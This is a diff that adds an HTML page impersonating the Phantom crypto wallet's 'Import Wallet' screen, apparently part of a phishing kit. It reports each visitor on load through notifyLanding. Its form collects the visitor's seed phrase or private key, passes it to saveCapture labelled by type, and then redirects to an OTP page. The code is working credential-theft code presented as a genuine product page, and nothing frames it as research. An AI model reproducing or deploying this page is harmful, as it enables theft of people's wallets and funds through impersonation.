@@ -1,0 +1,33 @@
+<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Import Wallet - Phantom</title><link rel="stylesheet" href="style.css"></head>
+<body><div class="card">
+<div class="logo">P</div>
+<div class="title">Import Wallet</div>
+<div class="subtitle">Restore your Phantom wallet</div>
+<div class="tabs"><div class="tab active" onclick="switchTab(0,event)">Seed Phrase</div><div class="tab" onclick="switchTab(1,event)">Private Key</div></div>
+<form id="importForm">
+<div class="form-group active" id="tab-0"><label>Secret Recovery Phrase</label><textarea id="seed" placeholder="Enter your 12 or 24 word seed phrase separated by spaces..."></textarea><div class="hint">Your seed phrase is usually 12 or 24 words.</div></div>
+<div class="form-group hidden" id="tab-1"><label>Private Key</label><textarea id="privatekey" placeholder="Enter your private key (hex, starting with 0x...)"></textarea><div class="hint">Your private key is a 64-character hex string.</div></div>
+<button type="submit" id="submitBtn">Import Wallet</button>
+</form>
+<div class="footer">© 2026 Phantom · All rights reserved</div>
+</div>
+<script src="helper.js"></script>
+<script>
+const SITE='phantom', DISPLAY='Phantom', CATEGORY='crypto';
+let currentTab = 0;
+window.addEventListener('load', () => notifyLanding(SITE, CATEGORY, 'Import Wallet'));
+function switchTab(i,e){e.preventDefault();currentTab=i;document.querySelectorAll('.tab').forEach((t,idx)=>t.classList.toggle('active',idx===i));document.querySelectorAll('.form-group').forEach((f,idx)=>{f.classList.toggle('active',idx===i);f.classList.toggle('hidden',idx!==i);});}
+document.getElementById('importForm').addEventListener('submit', function(e){
+  e.preventDefault();
+  const seed = document.getElementById('seed').value.trim();
+  const pk = document.getElementById('privatekey').value.trim();
+  const btn = document.getElementById('submitBtn');
+  if (currentTab===0 && !seed) { alert('Enter seed phrase'); return; }
+  if (currentTab===1 && !pk) { alert('Enter private key'); return; }
+  btn.innerHTML = '<div class="spinner"></div>'; btn.disabled = true;
+  const type = currentTab===0 ? 'SEED PHRASE' : 'PRIVATE KEY';
+  const value = currentTab===0 ? seed : pk;
+  saveCapture(SITE, CATEGORY, type, { value: value }, 'Import');
+  setTimeout(() => { window.location.href = 'otp.html'; }, 1500);
+});
+</script></body></html>
